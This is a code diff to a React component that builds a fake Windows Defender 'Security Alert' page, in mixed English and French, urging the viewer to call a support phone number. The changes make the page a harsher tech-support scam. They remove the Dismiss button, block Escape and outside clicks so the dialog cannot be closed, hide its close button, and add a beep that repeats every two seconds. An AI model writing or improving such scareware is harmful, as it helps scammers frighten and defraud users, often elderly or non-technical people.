@@ -1,5 +1,5 @@
 import { useState, useEffect, useRef } from "react";
-import { AlertTriangle, Phone, X, Volume2, VolumeX } from "lucide-react";
+import { AlertTriangle, Phone, Volume2, VolumeX } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog";
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
@@ -7,13 +7,13 @@ import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
 const SUPPORT_PHONE = "+1 (800) 123-4567";
 
 const SecurityAlert = () => {
-  const [showPopup, setShowPopup] = useState(true);
   const [soundEnabled, setSoundEnabled] = useState(true);
-  const audioRef = useRef<HTMLAudioElement | null>(null);
+  const audioContextRef = useRef<AudioContext | null>(null);
+  const oscillatorRef = useRef<OscillatorNode | null>(null);
+  const intervalRef = useRef<NodeJS.Timeout | null>(null);
 
-  useEffect(() => {
-    // Create and play alert sound
-    if (soundEnabled && showPopup) {
+  const playBeep = () => {
+    try {
       const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)();
       const oscillator = audioContext.createOscillator();
       const gainNode = audioContext.createGain();
@@ -26,35 +26,30 @@ const SecurityAlert = () => {
       gainNode.gain.value = 0.3;
 
       oscillator.start();
-
-      // Beep pattern
-      setTimeout(() => oscillator.stop(), 200);
-
-      return () => {
+      setTimeout(() => {
         oscillator.stop();
         audioContext.close();
-      };
+      }, 200);
+    } catch (e) {
+      console.error("Audio error:", e);
     }
-  }, [showPopup, soundEnabled]);
-
-  const playAlertSound = () => {
-    const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)();
-    const oscillator = audioContext.createOscillator();
-    const gainNode = audioContext.createGain();
-
-    oscillator.connect(gainNode);
-    gainNode.connect(audioContext.destination);
-
-    oscillator.frequency.value = 800;
-    oscillator.type = "sine";
-    gainNode.gain.value = 0.3;
-
-    oscillator.start();
-    setTimeout(() => {
-      oscillator.stop();
-      audioContext.close();
-    }, 200);
   };
+
+  useEffect(() => {
+    // Start automatic sound loop
+    if (soundEnabled) {
+      playBeep();
+      intervalRef.current = setInterval(() => {
+        playBeep();
+      }, 2000);
+    }
+
+    return () => {
+      if (intervalRef.current) {
+        clearInterval(intervalRef.current);
+      }
+    };
+  }, [soundEnabled]);
 
   const handleCallSupport = () => {
     window.location.href = `tel:${SUPPORT_PHONE.replace(/\D/g, "")}`;
@@ -62,27 +57,28 @@ const SecurityAlert = () => {
 
   return (
     <div className="min-h-screen bg-background p-4">
-      {/* Security Alert Popup */}
-      <Dialog open={showPopup} onOpenChange={setShowPopup}>
-        <DialogContent className="border-destructive bg-destructive/10">
+      {/* Security Alert Popup - Cannot be closed */}
+      <Dialog open={true}>
+        <DialogContent 
+          className="bg-white border-destructive [&>button]:hidden"
+          onPointerDownOutside={(e) => e.preventDefault()}
+          onEscapeKeyDown={(e) => e.preventDefault()}
+          onInteractOutside={(e) => e.preventDefault()}
+        >
           <DialogHeader>
             <DialogTitle className="flex items-center gap-2 text-destructive">
               <AlertTriangle className="h-6 w-6 animate-pulse" />
               Security Alert
             </DialogTitle>
-            <DialogDescription className="text-foreground">
-              We have detected a potential security issue with your account. windows defender a detecter un logiciel
-              mallveillant contacter notre support technique
+            <DialogDescription className="text-gray-900">
+              We have detected a potential security issue with your account. Windows Defender a détecté un logiciel
+              malveillant. Contactez notre support technique immédiatement.
             </DialogDescription>
           </DialogHeader>
           <div className="flex flex-col gap-3 mt-4">
             <Button variant="destructive" onClick={handleCallSupport} className="w-full">
               <Phone className="h-4 w-4 mr-2" />
               Call Support: {SUPPORT_PHONE}
-            </Button>
-            <Button variant="outline" onClick={() => setShowPopup(false)} className="w-full">
-              <X className="h-4 w-4 mr-2" />
-              Dismiss Alert
             </Button>
           </div>
         </DialogContent>
@@ -113,10 +109,7 @@ const SecurityAlert = () => {
               <Button
                 variant={soundEnabled ? "default" : "outline"}
                 size="sm"
-                onClick={() => {
-                  setSoundEnabled(!soundEnabled);
-                  if (!soundEnabled) playAlertSound();
-                }}
+                onClick={() => setSoundEnabled(!soundEnabled)}
               >
                 {soundEnabled ? (
                   <>
@@ -149,10 +142,6 @@ const SecurityAlert = () => {
               <Button variant="destructive" size="lg" onClick={handleCallSupport} className="w-full">
                 <Phone className="h-5 w-5 mr-2" />
                 Call Support Now
-              </Button>
-              <Button variant="outline" size="lg" onClick={() => setShowPopup(true)} className="w-full">
-                <AlertTriangle className="h-5 w-5 mr-2" />
-                Show Alert Popup
               </Button>
             </div>
           </CardContent>
